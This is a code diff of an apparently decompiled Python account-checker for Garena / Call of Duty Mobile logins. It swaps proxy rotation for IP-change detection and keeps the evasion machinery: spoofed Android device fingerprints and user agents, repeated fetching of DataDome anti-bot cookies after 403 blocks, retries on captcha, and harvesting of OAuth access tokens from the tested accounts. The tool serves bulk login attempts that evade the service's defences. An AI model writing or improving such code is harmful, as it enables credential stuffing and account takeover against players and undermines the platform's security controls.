@@ -1,4 +1,4 @@
-#Decode By Crazy | @Po
+#Decode By Crazy | @Po 
 import os
 import sys
 import time
@@ -186,90 +186,51 @@ class GeoRotator:
 geo_rotator = GeoRotator()
 
 _ANDROID_DEVICES = [
-    ("SM-S928B",  "AP3A.241005.015"),
-    ("SM-S926B",  "AP2A.240905.003"),
-    ("SM-S918B",  "UP1A.231005.007"),
-    ("SM-S911B",  "UP1A.231005.007"),
-    ("SM-S906B",  "SP1A.210812.016"),
-    ("SM-S901B",  "SP1A.210812.016"),
-    ("SM-G991B",  "UP1A.231005.007"),
-    ("SM-A546B",  "UP1A.231005.007"),
-    ("SM-A156B",  "AP2A.240805.005"),
-    ("SM-A536B",  "SP1A.210812.016"),
-    ("SM-A346B",  "TP1A.220624.014"),
-    ("SM-A245F",  "TP1A.220624.014"),
-    ("SM-A235F",  "TP1A.220624.014"),
-    ("SM-A135F",  "TP1A.220624.014"),
-    ("Pixel 9 Pro",  "AP4A.250205.002"),
-    ("Pixel 8",      "AP2A.240905.003"),
-    ("Pixel 7a",     "UP1A.231005.007"),
-    ("Pixel 7",      "TQ3A.230901.001"),
-    ("Pixel 6a",     "TP1A.220905.004"),
-    ("Pixel 5",      "RD1A.200810.022"),
+    ("SM-S928B",  "AP3A.241005.015"),  ("SM-S926B",  "AP2A.240905.003"),
+    ("SM-S918B",  "UP1A.231005.007"),  ("SM-S911B",  "UP1A.231005.007"),
+    ("SM-S906B",  "SP1A.210812.016"),  ("SM-S901B",  "SP1A.210812.016"),
+    ("SM-G991B",  "UP1A.231005.007"),  ("SM-A546B",  "UP1A.231005.007"),
+    ("SM-A156B",  "AP2A.240805.005"),  ("SM-A536B",  "SP1A.210812.016"),
+    ("SM-A346B",  "TP1A.220624.014"),  ("SM-A245F",  "TP1A.220624.014"),
+    ("SM-A235F",  "TP1A.220624.014"),  ("SM-A135F",  "TP1A.220624.014"),
+    ("Pixel 9 Pro",  "AP4A.250205.002"), ("Pixel 8",   "AP2A.240905.003"),
+    ("Pixel 7a",     "UP1A.231005.007"), ("Pixel 7",   "TQ3A.230901.001"),
+    ("Pixel 6a",     "TP1A.220905.004"), ("Pixel 5",   "RD1A.200810.022"),
     ("Pixel 4",      "PQ3A.190801.002"),
-    ("23127PN0CG",   "AP2A.240905.003"),
-    ("23049PCD8G",   "UKQ1.230804.001"),
-    ("2312DRA50G",   "UKQ1.230804.001"),
-    ("23021RAAEG",   "AQ3A.240829.003"),
-    ("2201116SG",    "UP1A.231005.007"),
-    ("22041219PG",   "AP1A.240505.005"),
-    ("22021211RG",   "TP1A.220624.014"),
-    ("2211133G",     "UP1A.231005.007"),
-    ("21091116AI",   "TKQ1.221114.001"),
-    ("M2102J20SG",   "RKQ1.211001.001"),
-    ("M2101K6G",     "AP1A.240405.002"),
-    ("23053RN02A",   "UKQ1.230804.001"),
-    ("22120RN86G",   "TKQ1.221114.001"),
-    ("21121119SG",   "TKQ1.221114.001"),
-    ("220333QAG",    "TKQ1.221114.001"),
-    ("CPH2609",   "TP1A.220624.014"),
-    ("CPH2591",   "AP2A.240805.005"),
-    ("CPH2551",   "TP1A.220624.014"),
-    ("CPH2385",   "SP1A.210812.016"),
-    ("CPH2269",   "RP1A.200720.011"),
-    ("V2307",     "TP1A.220624.014"),
-    ("V2254A",    "UP1A.231005.007"),
-    ("V2219",     "SP1A.210812.016"),
-    ("V2109",     "RP1A.200720.011"),
-    ("V2038",     "RP1A.200720.011"),
-    ("RMX3771",   "AP1A.240405.002"),
-    ("RMX3686",   "TP1A.220624.014"),
-    ("RMX3521",   "SP1A.210812.016"),
-    ("RMX3393",   "SP1A.210812.016"),
-    ("RMX3031",   "RP1A.200720.011"),
-    ("RMX2195",   "RP1A.200720.011"),
-    ("CPH2449",   "TP1A.220624.014"),
-    ("LE2125",    "AP1A.240505.005"),
-    ("LE2115",    "SP1A.210812.016"),
-    ("IN2025",    "UP1A.231005.007"),
-    ("IN2013",    "RP1A.200720.011"),
-    ("KB2003",    "AP2A.240805.005"),
-    ("POCO X5 Pro",  "TKQ1.221114.001"),
-    ("POCO F4",      "TKQ1.221114.001"),
-    ("POCO M4 Pro",  "SP1A.210812.016"),
-    ("POCO X4 GT",   "TP1A.220624.014"),
-    ("moto g84 5G",  "UKQ1.230917.001"),
-    ("moto g72",     "T2RLS33.69-23-6"),
-    ("moto e32",     "SRPWS31.Q3-46-39"),
-    ("XT2153-1",     "RPBS31.Q3-46-37"),
-    ("Lenovo TB-9707F",  "AP3A.240905.015.A2"),
-    ("Lenovo K13 Note",  "RP1A.200720.011"),
-    ("Nokia G60",  "TP1A.220624.014"),
-    ("Nokia X30",  "TP1A.220624.014"),
+    ("23127PN0CG",  "AP2A.240905.003"),  ("23049PCD8G", "UKQ1.230804.001"),
+    ("2312DRA50G",  "UKQ1.230804.001"),  ("23021RAAEG", "AQ3A.240829.003"),
+    ("2201116SG",   "UP1A.231005.007"),  ("22041219PG", "AP1A.240505.005"),
+    ("22021211RG",  "TP1A.220624.014"),  ("2211133G",   "UP1A.231005.007"),
+    ("21091116AI",  "TKQ1.221114.001"),  ("M2102J20SG", "RKQ1.211001.001"),
+    ("M2101K6G",    "AP1A.240405.002"),  ("23053RN02A", "UKQ1.230804.001"),
+    ("22120RN86G",  "TKQ1.221114.001"),  ("21121119SG", "TKQ1.221114.001"),
+    ("220333QAG",   "TKQ1.221114.001"),
+    ("CPH2609",  "TP1A.220624.014"),  ("CPH2591",  "AP2A.240805.005"),
+    ("CPH2551",  "TP1A.220624.014"),  ("CPH2385",  "SP1A.210812.016"),
+    ("CPH2269",  "RP1A.200720.011"),  ("V2307",    "TP1A.220624.014"),
+    ("V2254A",   "UP1A.231005.007"),  ("V2219",    "SP1A.210812.016"),
+    ("V2109",    "RP1A.200720.011"),  ("V2038",    "RP1A.200720.011"),
+    ("RMX3771",  "AP1A.240405.002"),  ("RMX3686",  "TP1A.220624.014"),
+    ("RMX3521",  "SP1A.210812.016"),  ("RMX3393",  "SP1A.210812.016"),
+    ("RMX3031",  "RP1A.200720.011"),  ("RMX2195",  "RP1A.200720.011"),
+    ("CPH2449",  "TP1A.220624.014"),
+    ("LE2125",   "AP1A.240505.005"),  ("LE2115",   "SP1A.210812.016"),
+    ("IN2025",   "UP1A.231005.007"),  ("IN2013",   "RP1A.200720.011"),
+    ("KB2003",   "AP2A.240805.005"),
+    ("POCO X5 Pro",  "TKQ1.221114.001"), ("POCO F4",      "TKQ1.221114.001"),
+    ("POCO M4 Pro",  "SP1A.210812.016"), ("POCO X4 GT",   "TP1A.220624.014"),
+    ("moto g84 5G",  "UKQ1.230917.001"), ("moto g72",     "T2RLS33.69-23-6"),
+    ("moto e32",     "SRPWS31.Q3-46-39"),("XT2153-1",     "RPBS31.Q3-46-37"),
+    ("Lenovo TB-9707F", "AP3A.240905.015.A2"), ("Lenovo K13 Note", "RP1A.200720.011"),
+    ("Nokia G60",  "TP1A.220624.014"),  ("Nokia X30",  "TP1A.220624.014"),
     ("Nokia C32",  "TP1A.220624.014"),
-    ("X6833B",    "TP1A.220624.014"),
-    ("X6515",     "SP1A.210812.016"),
+    ("X6833B",    "TP1A.220624.014"),  ("X6515",    "SP1A.210812.016"),
     ("X669C",     "RP1A.200720.011"),
-    ("TECNO KI7",   "TP1A.220624.014"),
-    ("TECNO LG7n",  "TP1A.220624.014"),
-    ("XQ-BE52",   "TP1A.220624.014"),
-    ("XQ-DC54",   "UP1A.231005.007"),
-    ("ASUS_AI2205",  "TKQ1.221114.001"),
-    ("ASUS_I006D",   "SP1A.210812.016"),
-    ("ZTE Blade A73 5G",  "SP1A.210812.016"),
-    ("nubia Z50S Pro",    "TP1A.220624.014"),
-    ("ELS-NX9",   "HUAWEIELS-NX9"),
-    ("MAR-LX1B",  "HUAWEIMAR-LX1B"),
+    ("TECNO KI7",   "TP1A.220624.014"), ("TECNO LG7n",  "TP1A.220624.014"),
+    ("XQ-BE52",   "TP1A.220624.014"),  ("XQ-DC54",  "UP1A.231005.007"),
+    ("ASUS_AI2205",  "TKQ1.221114.001"), ("ASUS_I006D",   "SP1A.210812.016"),
+    ("ZTE Blade A73 5G", "SP1A.210812.016"), ("nubia Z50S Pro", "TP1A.220624.014"),
+    ("ELS-NX9",   "HUAWEIELS-NX9"),    ("MAR-LX1B",  "HUAWEIMAR-LX1B"),
     ("VOG-L29",   "HUAWEIVOG-L29"),
 ]
 
@@ -281,60 +242,12 @@ _CHROME_VERSIONS = [
     "142.0.7381.100", "143.0.7440.50",  "144.0.7559.59",
 ]
 
-
-_ANDROID_VERSIONS = [11, 12, 13, 14, 15]
-
+_ANDROID_VERSIONS  = [11, 12, 13, 14, 15]
 _GARENA_SDK_VERSION = "5.12.1"
 
 
-def random_ua():
-    device, build = random.choice(_ANDROID_DEVICES)
-    chrome        = random.choice(_CHROME_VERSIONS)
-    android       = random.choice(_ANDROID_VERSIONS)
-    chrome_major  = chrome.split(".")[0]
-    dev_id        = f"02-{uuid.uuid4()}"
-
-    ua_full = (
-        f"Mozilla/5.0 (Linux; Android {android}; {device} "
-        f"Build/{build}; wv) AppleWebKit/537.36 "
-        f"(KHTML, like Gecko) Version/4.0 "
-        f"Chrome/{chrome} Mobile Safari/537.36; "
-        f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
-    )
-    ua_short = f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
-    return ua_full, ua_short, chrome_major, dev_id
-
-
-def build_garena_headers():
-    ua_full, _ua_short, chrome_major, _dev_id = random_ua()
-    return {
-        "User-Agent":        ua_full,
-        "Accept":            "application/json, text/plain, */*",
-        "Accept-Encoding":   "gzip, deflate, br, zstd",
-        "Accept-Language":   "en-US,en;q=0.9",
-        "sec-ch-ua":         (
-            f'"Chromium";v="{chrome_major}", '
-            f'"Not(A:Brand";v="8", '
-            f'"Android WebView";v="{chrome_major}"'
-        ),
-        "sec-ch-ua-mobile":   "?1",
-        "sec-ch-ua-platform": '"Android"',
-        "sec-fetch-dest":     "empty",
-        "sec-fetch-mode":     "cors",
-        "sec-fetch-site":     "same-origin",
-        "x-requested-with":   "com.garena.game.codm",
-        "Origin":             "https://100082.connect.garena.com",
-        "Referer": (
-            "https://100082.connect.garena.com/universal/oauth"
-            "?client_id=100082&locale=en-US&create_grant=true"
-            "&login_scenario=normal&redirect_uri=gop100082://auth/"
-            "&response_type=code"
-        ),
-    }
-
-
 class DeviceManager:
-
+    
     def __init__(self):
         self._idx  = 0
         self._lock = threading.Lock()
@@ -343,33 +256,27 @@ class DeviceManager:
         with self._lock:
             device, build = _ANDROID_DEVICES[self._idx % len(_ANDROID_DEVICES)]
             self._idx += 1
-
         chrome       = random.choice(_CHROME_VERSIONS)
         android      = random.choice(_ANDROID_VERSIONS)
         chrome_major = chrome.split(".")[0]
         dev_id       = f"02-{uuid.uuid4()}"
-
         ua_full = (
             f"Mozilla/5.0 (Linux; Android {android}; {device} "
             f"Build/{build}; wv) AppleWebKit/537.36 "
             f"(KHTML, like Gecko) Version/4.0 "
-            f"Chrome/{chrome} Mobile Safari/137.36; "
+            f"Chrome/{chrome} Mobile Safari/537.36; "
             f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
-        )
-        ua_short = (
-            f"GarenaMSDK/{_GARENA_SDK_VERSION}"
-            f"({device} ;Android {android};en;us;)"
         )
         return {
             "device": device, "build": build,
             "android": android, "chrome": chrome,
             "chrome_major": chrome_major,
             "device_id": dev_id,
-            "ua_full": ua_full, "ua_short": ua_short,
+            "ua_full": ua_full,
+            "ua_short": f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)",
         }
 
     def get_random(self) -> dict:
-        
         device, build = random.choice(_ANDROID_DEVICES)
         chrome        = random.choice(_CHROME_VERSIONS)
         android       = random.choice(_ANDROID_VERSIONS)
@@ -382,16 +289,13 @@ class DeviceManager:
             f"Chrome/{chrome} Mobile Safari/537.36; "
             f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)"
         )
-        ua_short = (
-            f"GarenaMSDK/{_GARENA_SDK_VERSION}"
-            f"({device} ;Android {android};en;us;)"
-        )
         return {
             "device": device, "build": build,
             "android": android, "chrome": chrome,
             "chrome_major": chrome_major,
             "device_id": dev_id,
-            "ua_full": ua_full, "ua_short": ua_short,
+            "ua_full": ua_full,
+            "ua_short": f"GarenaMSDK/{_GARENA_SDK_VERSION}({device} ;Android {android};en;us;)",
         }
 
 
@@ -556,45 +460,92 @@ class DataDomeManager:
             logger.warning(f"[WARNING] Error setting datadome cookie: {e}")
             return False
 
-    def handle_403(self, session, telegram_config=None):
-        """On EVERY 403 — immediately force-rotate proxy, refresh DataDome, resume."""
+    def get_current_ip(self):
+        ip_services = [
+            'https://api.ipify.org',
+            'https://icanhazip.com',
+            'https://ident.me',
+            'https://checkip.amazonaws.com'
+        ]
+        
+        for service in ip_services:
+            try:
+                response = requests.get(service, timeout=10)
+                if response.status_code == 200:
+                    ip = response.text.strip()
+                    if ip and '.' in ip:  
+                        return ip
+            except Exception:
+                continue
+        
+        logger.warning(f"[WARNING] Could not fetch IP from any service")
+        return None
+
+    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
+        logger.info(f"[INFO] Auto-detecting IP change...")
+        
+        original_ip = self.get_current_ip()
+        if not original_ip:
+            logger.warning(f"[WARNING] Could not determine current IP, waiting 60 seconds")
+            time.sleep(10)
+            return True
+            
+        logger.info(f"[INFO] Current IP: {original_ip}")
+        logger.info(f"[INFO] Waiting for IP change (checking every {check_interval} seconds, max {max_wait_time//60} minutes)...")
+        
+        start_time = time.time()
+        attempts = 0
+        
+        while time.time() - start_time < max_wait_time:
+            attempts += 1
+            current_ip = self.get_current_ip()
+            
+            if current_ip and current_ip != original_ip:
+                logger.info(f"[SUCCESS] IP changed from {original_ip} to {current_ip}")
+                logger.info(f"[INFO] IP changed successfully after {attempts} checks!")
+                return True
+            else:
+                if attempts % 5 == 0:  
+                    logger.info(f"[INFO] IP check {attempts}: Still {original_ip} -> Auto-retrying...")
+                time.sleep(check_interval)
+        
+        logger.warning(f"[WARNING] IP did not change after {max_wait_time} seconds")
+        return False
+
+    def handle_403(self, session):
         self._403_attempts += 1
+        logger.warning(f"[WARNING] 403 received (attempt {self._403_attempts}) — fetching new DataDome cookie immediately...")
 
-        old_proxy = geo_rotator.current_proxy
-
-        logger.warning(f"[403] 🚫 Access denied — force-rotating proxy instantly... (attempt #{self._403_attempts})")
-        logger.warning(f"[403] Old proxy: {old_proxy}")
-
-        # ── Force rotate proxy immediately ────────────────────
-        new_proxy = geo_rotator.force_rotate()
-        session.proxies.update(geo_rotator.get_proxies())
-        logger.info(f"[403] ✅ Thread {threading.get_ident()} rotated → {new_proxy}")
-
-        # ── Fetch fresh DataDome on new proxy ─────────────────
-        time.sleep(1.0)  # give proxy time to stabilise before fetching datadome
+        
         new_datadome = get_datadome_cookie(session)
         if new_datadome:
             self.set_datadome(new_datadome)
             self.set_session_datadome(session, new_datadome)
             self._403_attempts = 0
-            logger.info(f"[403] 🍪 Fresh DataDome obtained | New proxy: {new_proxy}")
-
+            logger.info(f"[SUCCESS] Fresh DataDome cookie obtained — 403 resolved")
             return True
-        else:
-            logger.warning(f"[403] ⚠️ Could not get DataDome on new proxy — trying next proxy...")
-            # Try one more rotation if datadome fails
-            new_proxy = geo_rotator.force_rotate()
-            session.proxies.update(geo_rotator.get_proxies())
-            time.sleep(0.3)
-            new_datadome = get_datadome_cookie(session)
-            if new_datadome:
-                self.set_datadome(new_datadome)
-                self.set_session_datadome(session, new_datadome)
+
+        if self._403_attempts >= 3:
+            logger.error(f"[ERROR] IP blocked after 3 attempts — fresh cookie fetch also failed.")
+            logger.error(f"[INFO] Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode")
+            logger.info(f"[INFO] Auto-detecting IP change...")
+
+            if self.wait_for_ip_change(session):
+                logger.info(f"[SUCCESS] IP changed, fetching new DataDome cookie...")
                 self._403_attempts = 0
-                logger.info(f"[403] ✅ DataDome obtained on fallback proxy: {new_proxy}")
-                return True
-            logger.error(f"[403] ❌ Failed to recover after 2 proxy rotations — skipping account")
-            return False
+                new_datadome2 = get_datadome_cookie(session)
+                if new_datadome2:
+                    self.set_datadome(new_datadome2)
+                    self.set_session_datadome(session, new_datadome2)
+                    logger.info(f"[SUCCESS] New DataDome cookie obtained after IP change")
+                    return True
+                else:
+                    logger.error(f"[ERROR] Failed to fetch new DataDome after IP change")
+                    return False
+            else:
+                logger.error(f"[ERROR] IP did not change, cannot continue")
+                return False
+        return False
 
 class LiveStats:
     def __init__(self):
@@ -718,7 +669,7 @@ def applyck(session, cookie_str):
     else:
         logger.warning(f"[WARNING] No valid cookies found in the provided string")
 
-def get_datadome_cookie(session, proxies=None):
+def get_datadome_cookie(session):
     url = 'https://dd.garena.com/js/'
     headers = {
         'accept': '*/*',
@@ -753,7 +704,7 @@ def get_datadome_cookie(session, proxies=None):
     data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
 
     try:
-        response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=10)
+        response = requests.post(url, headers=headers, data=data, timeout=10)
         response.raise_for_status()
         response_json = response.json()
         
@@ -798,10 +749,32 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
             
             
-            headers = build_garena_headers()
-            headers['accept-encoding'] = 'gzip, deflate, br, zstd'
-            headers['connection'] = 'keep-alive'
-            headers['host'] = '100082.connect.garena.com'
+            dev = _device_manager.get_next()
+            headers = {
+                "user-agent":        dev["ua_full"],
+                "accept":            "application/json, text/plain, */*",
+                "accept-encoding":   "gzip, deflate, br, zstd",
+                "accept-language":   "en-US,en;q=0.9",
+                "connection":        "keep-alive",
+                "host":              "100082.connect.garena.com",
+                "sec-ch-ua": (
+                    f'"Chromium";v="{dev["chrome_major"]}", '
+                    f'"Not(A:Brand";v="8", '
+                    f'"Android WebView";v="{dev["chrome_major"]}"'
+                ),
+                "sec-ch-ua-mobile":   "?1",
+                "sec-ch-ua-platform": '"Android"',
+                "sec-fetch-dest":     "empty",
+                "sec-fetch-mode":     "cors",
+                "sec-fetch-site":     "same-origin",
+                "x-requested-with":   "com.garena.game.codm",
+                "referer": (
+                    "https://100082.connect.garena.com/universal/oauth"
+                    "?client_id=100082&locale=en-US&create_grant=true"
+                    "&login_scenario=normal&redirect_uri=gop100082://auth/"
+                    "&response_type=code"
+                ),
+            }
             
             if cookie_header:
                 headers['cookie'] = cookie_header
@@ -843,31 +816,17 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
             new_datadome = new_cookies.get('datadome')
             
             if response.status_code == 403:
-                console.print(f"      [bold blue]🚫 Access denied (403)[/bold blue]")
-                console.print(f"      [bold blue]🛡️ Security check triggered[/bold blue]")
-
+                
+                fresh_dd = get_datadome_cookie(session)
+                if fresh_dd:
+                    datadome_manager.set_datadome(fresh_dd)
+                    datadome_manager.set_session_datadome(session, fresh_dd)
+                    new_datadome = fresh_dd
                 if attempt < retries - 1:
-                    if geo_rotator and geo_rotator.total > 0:
-                        logger.info(f"      🔄 Switching IP to fetch fresh Cookie...")
-                        new_proxy = geo_rotator.force_rotate()
-                        session.proxies.update(new_proxy)
-                        fresh_dd = get_datadome_cookie(session, proxies=new_proxy)
-                        if fresh_dd:
-                            datadome_manager.set_datadome(fresh_dd)
-                            datadome_manager.set_session_datadome(session, fresh_dd)
-                            logger.info(f"      ✔ Fresh Cookie obtained — retrying...")
-                        else:
-                            logger.warning(f"      ⚠️ Could not fetch Cookie via new proxy — retrying anyway...")
-                    else:
-                        logger.info(f"      🔄 Retrying with new cookies...")
-                        time.sleep(0.3)
+                    time.sleep(1)
                     continue
-
-                if datadome_manager.handle_403(session):
-                    return "IP_BLOCKED", None, None
-                else:
-                    logger.error(f"      🚨 IP blocked - cannot continue")
-                    return None, None, new_datadome
+                
+                return "IP_BLOCKED", None, new_datadome
             
             response.raise_for_status()
             
@@ -877,7 +836,7 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                 logger.error(f"      ✘ Invalid response format")
                 logger.error(f"      📄 Could not parse server response")
                 if attempt < retries - 1:
-                    time.sleep(0.3)
+                    time.sleep(2)
                     continue
                 return None, None, new_datadome
             
@@ -901,8 +860,8 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
         except requests.exceptions.HTTPError as e:
             if hasattr(e, 'response') and e.response is not None:
                 if e.response.status_code == 403:
-                    console.print(f"      [bold blue]🚫 Access denied (403)[/bold blue]")
-                    console.print(f"      [bold blue]🛡️ Security check triggered[/bold blue]")
+                    logger.error(f"      🚫 Access denied (403)")
+                    logger.error(f"      🛡️ Security check triggered")
                     
                     new_cookies = {}
                     if 'set-cookie' in e.response.headers:
@@ -920,28 +879,21 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                                 except Exception as ex:
                                     pass
                     
-                    if attempt < retries - 1:
-                        if geo_rotator and geo_rotator.total > 0:
-                            logger.info(f"      🔄 Switching IP to fetch fresh Cookie...")
-                            new_proxy = geo_rotator.force_rotate()
-                            session.proxies.update(new_proxy)
-                            fresh_dd = get_datadome_cookie(session, proxies=new_proxy)
-                            if fresh_dd:
-                                datadome_manager.set_datadome(fresh_dd)
-                                datadome_manager.set_session_datadome(session, fresh_dd)
-                                logger.info(f"      ✔ Fresh Cookie obtained — retrying...")
-                            else:
-                                logger.warning(f"      ⚠️ Could not fetch Cookie via new proxy — retrying anyway...")
-                        else:
-                            logger.info(f"      🔄 Retrying with new cookies...")
-                            time.sleep(0.3)
+                    if new_cookies and attempt < retries - 1:
+                        logger.info(f"      🔄 Retrying with new cookies...")
+                        time.sleep(2)
                         continue
-
+                    
                     if datadome_manager.handle_403(session):
                         return "IP_BLOCKED", None, None
                     else:
                         logger.error(f"      🚨 IP blocked - cannot continue")
                         return None, None, new_cookies.get('datadome')
+                        
+                    if attempt < retries - 1:
+                        time.sleep(2)
+                        continue
+                    return None, None, new_cookies.get('datadome')
                 else:
                     logger.error(f"      ✘ HTTP {e.response.status_code}")
                     logger.error(f"      🖥️ Server error")
@@ -950,12 +902,12 @@ def prelogin(session, account, datadome_manager, telegram_config=None):
                 logger.error(f"      🌐 Could not reach server")
                 
             if attempt < retries - 1:
-                time.sleep(0.3)
+                time.sleep(2)
                 continue
         except Exception as e:
             logger.error(f"      💥 Unexpected error: {str(e)[:50]}")
             if attempt < retries - 1:
-                time.sleep(0.3)
+                time.sleep(2)
                 
     return None, None, None
 
@@ -981,31 +933,62 @@ def login(session, account, password, v1, v2):
     cookie_header = '; '.join(cookie_parts) if cookie_parts else ''
     
     
+    dev = _device_manager.get_next()
     headers = {
-        'accept': 'application/json, text/plain, */*',
-        'host': '100082.connect.garena.com',
-        'referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
-        'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
-        'sec-ch-ua-mobile': '?1',
+        'accept':            'application/json, text/plain, */*',
+        'accept-encoding':   'gzip, deflate, br, zstd',
+        'accept-language':   'en-US,en;q=0.9',
+        'host':              '100082.connect.garena.com',
+        'referer': (
+            'https://100082.connect.garena.com/universal/oauth'
+            '?client_id=100082&locale=en-US&create_grant=true'
+            '&login_scenario=normal&redirect_uri=gop100082://auth/'
+            '&response_type=code'
+        ),
+        'sec-ch-ua': (
+            f'"Not(A:Brand";v="8", '
+            f'"Chromium";v="{dev["chrome_major"]}", '
+            f'"Android WebView";v="{dev["chrome_major"]}"'
+        ),
+        'sec-ch-ua-mobile':   '?1',
         'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'x-requested-with': 'com.garena.game.codm',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)'
+        'sec-fetch-dest':     'empty',
+        'sec-fetch-mode':     'cors',
+        'sec-fetch-site':     'same-origin',
+        'x-requested-with':   'com.garena.game.codm',
+        'user-agent':         dev["ua_full"],
     }
-    
+
     if cookie_header:
         headers['cookie'] = cookie_header
-    
+
     retries = 3
     for attempt in range(retries):
         try:
-            response = session.get(url, headers=headers, params=params, timeout=30)
+            
+            current_cookies = session.cookies.get_dict()
+            cookie_parts = []
+            for _cn in ['apple_state_key', 'datadome', 'sso_key']:
+                if _cn in current_cookies:
+                    cookie_parts.append(f"{_cn}={current_cookies[_cn]}")
+            headers['cookie'] = '; '.join(cookie_parts) if cookie_parts else ''
+
+            response = session.get(url, headers=headers, params=params, timeout=12)
+
+
+            if response.status_code == 403:
+                fresh_dd = get_datadome_cookie(session)
+                if fresh_dd:
+                    session.cookies.set('datadome', fresh_dd, domain='.garena.com')
+                if attempt < retries - 1:
+                    time.sleep(1)
+                    continue
+                return None
+
             response.raise_for_status()
-            
+
             login_cookies = {}
-            
+
             if 'set-cookie' in response.headers:
                 set_cookie_header = response.headers['set-cookie']
                 for cookie_str in set_cookie_header.split(','):
@@ -1015,17 +998,17 @@ def login(session, account, password, v1, v2):
                             cookie_value = cookie_str.split('=')[1].split(';')[0].strip()
                             if cookie_name and cookie_value:
                                 login_cookies[cookie_name] = cookie_value
-                        except Exception as e:
+                        except Exception:
                             pass
-            
+
             try:
                 response_cookies = response.cookies.get_dict()
                 for cookie_name, cookie_value in response_cookies.items():
                     if cookie_name not in login_cookies:
                         login_cookies[cookie_name] = cookie_value
-            except Exception as e:
+            except Exception:
                 pass
-            
+
             for cookie_name, cookie_value in login_cookies.items():
                 if cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
                     session.cookies.set(cookie_name, cookie_value, domain='.garena.com')
@@ -1035,7 +1018,7 @@ def login(session, account, password, v1, v2):
             except json.JSONDecodeError:
                 logger.error(f"      ✘ Invalid JSON response from login")
                 if attempt < retries - 1:
-                    time.sleep(0.3)
+                    time.sleep(2)
                     continue
                 return None
             
@@ -1051,7 +1034,7 @@ def login(session, account, password, v1, v2):
                 elif 'captcha' in error_msg.lower():
                     logger.warning(f"     ✘ Login failed: Captcha required")
                     logger.warning(f"         └─ 🤖 Reason: {error_msg}")
-                    time.sleep(0.5)
+                    time.sleep(3)
                     continue
                 else:
                     logger.warning(f"     ✘ Login failed: Invalid credentials")
@@ -1063,7 +1046,7 @@ def login(session, account, password, v1, v2):
         except requests.RequestException as e:
             logger.error(f"      ✘ Login request failed (attempt {attempt + 1}): {e}")
             if attempt < retries - 1:
-                time.sleep(0.3)
+                time.sleep(2)
                 
     return None
 
@@ -1071,12 +1054,19 @@ def login(session, account, password, v1, v2):
 def get_codm_access_token(session):
     try:
         random_id = str(int(time.time() * 1000))
-        dev = _device_manager.get_next()
 
-        grant_url     = "https://100082.connect.garena.com/oauth/token/grant"
-        grant_headers = build_garena_headers()
-        grant_headers["Pragma"]       = "no-cache"
-        grant_headers["Content-Type"] = "application/x-www-form-urlencoded;charset=UTF-8"
+        
+        grant_url = "https://100082.connect.garena.com/oauth/token/grant"
+        grant_headers = {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) "
+                           "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 "
+                           "Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
+            "Pragma": "no-cache",
+            "Accept": "application/json, text/plain, */*",
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "Origin": "https://100082.connect.garena.com",
+            "Referer": "https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code",
+        }
 
         grant_data = {
             "client_id": "100082",
@@ -1097,17 +1087,19 @@ def get_codm_access_token(session):
             logger.error("[ERROR] CODM token grant failed: no authorization code in response")
             return ""
 
+        
         exchange_url = "https://100082.connect.garena.com/oauth/token/exchange"
         exchange_headers = {
-            "User-Agent": dev["ua_short"],
+            "User-Agent": "GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)",
             "Accept": "application/json, text/plain, */*",
             "Content-Type": "application/x-www-form-urlencoded",
         }
 
+        
         exchange_data = {
             "grant_type": "authorization_code",
             "code": auth_code,
-            "device_id": dev["device_id"],
+            "device_id": "02-dc0cd806-a2b4-48ff-b5b5-0264b847352d",
             "redirect_uri": "gop100082://auth/",
             "source": "2",
             "client_id": "100082",
@@ -1127,7 +1119,6 @@ def get_codm_access_token(session):
     except Exception as e:
         logger.error(f"[ERROR] Error getting CODM access token: {e}")
         return ""
-
 
 def process_codm_callback(session, access_token):
     try:
@@ -1185,7 +1176,6 @@ def process_codm_callback(session, access_token):
     except Exception as e:
         logger.error(f"[ERROR] Error processing CODM callback: {e}")
         return None, "error"
-
 
 def get_codm_user_info(session, token):
     try:
